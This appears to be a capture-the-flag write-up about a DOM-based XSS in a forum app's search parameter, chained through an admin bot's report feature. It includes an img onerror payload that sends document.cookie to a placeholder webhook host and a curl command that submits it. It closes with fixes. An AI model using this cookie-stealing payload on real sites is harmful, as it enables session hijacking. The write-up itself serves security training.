---
title: "Paid Forums — DOM XSS → Admin Bot Cookie Theft"
published: 2026-08-31
description: "A home-grown URL parser drops ?search= straight into innerHTML. A crafted report ID makes the admin bot open it and leaks its flag cookie."
tags: ["CTF", "Web", "XSS", "HackTheBox"]
category: CTF
draft: false
---

> **Target:** `http://154.57.164.82:30373` · Express · nunjucks · SQLite · Puppeteer bot
> **Vuln:** DOM-based XSS · **Severity:** High
> One of three HTB-style web challenges — each a small ransomware-as-a-service panel guarded by a headless admin bot.

## Gist

The client parses the URL with a home-grown `parseParams()` and drops `?search=` straight into `innerHTML`. The abuse-report feature makes an admin bot open an attacker-chosen path under `/posts/` while holding the `flag` cookie — so a crafted report ID delivers the XSS to the bot and exfiltrates its cookie.

## The sink

Server-side rendering is safe — nunjucks runs with `autoescape: true`. The bug is entirely client-side, in `static/js/forum.js`, which runs on every page (including `/posts/:id`):

```js
// static/js/forum.js
window.onload = () => {
  // ...
  let params = parseParams(location.href);
  if (params.hasOwnProperty('search')) {
    $('#search-res').style.display = 'block';
    $('#search-msg').innerHTML = `Search results for "${params.search}" :`;  // <-- sink
  }
}
```

`params.search` comes from `parseParams(location.href)`, a custom query parser, and is written to `innerHTML` with no encoding — a textbook DOM XSS. Any page that includes `forum.js` and reads `location` is vulnerable, and `post.html` ships both the script and the `#search-msg` element.

## Reaching the bot

The flag lives in the admin bot's cookie (`domain: 127.0.0.1:1337`, no `HttpOnly` → readable from JS). The report endpoint drives that bot:

```js
// route: only parseInt() is checked server-side
router.get('/posts/:id', (req, res) => {
  const { id } = req.params;
  if (!isNaN(parseInt(id))) { /* render post.html for parseInt(id) */ }
});

// bot.js — id is concatenated into the URL, unvalidated
await page.setCookie({ name: "flag", value: "HTB{...}", domain: "127.0.0.1:1337" });
await page.goto(`http://127.0.0.1:1337/posts/${id}`, { waitUntil: 'networkidle2' });
```

The server only calls `parseInt(id)`, but the bot navigates to the raw `/posts/${id}` string. So an ID like `1?search=<payload>` resolves to post **1** server-side (`parseInt("1") === 1`) while the browser lands on a URL whose `?search=` query fires the sink.

## Exploit

1. Craft a report ID that carries the payload as a query string on a valid post:

   ```
   1?search=<img src=x onerror="new Image().src='//WEBHOOK/?c='+encodeURIComponent(document.cookie)">
   ```

2. Submit it to the report endpoint so the admin bot opens it:

   ```bash
   curl -s http://154.57.164.82:30373/api/report \
     -H 'Content-Type: application/json' \
     --data-raw '{"id":"1?search=<img src=x onerror=...>"}'
   ```

3. The bot loads `/posts/1?search=…`, `forum.js` writes the payload into `#search-msg`, and `onerror` beacons `document.cookie` (flag included) to the collector.

## Flag

```
HTB{…captured via bot cookie exfil…}
```

## Takeaways

- Server-side validation (`parseInt`) and client-side navigation disagreed on what the ID *is* — the classic parser-differential that turns a validated route into an XSS delivery vector.
- A non-`HttpOnly` cookie plus a headless admin bot is a cookie-theft chain waiting to happen.
- **Fix:** encode before `innerHTML` (or use `textContent`); validate the full ID string, not just its numeric prefix; set `HttpOnly` on session/flag cookies.
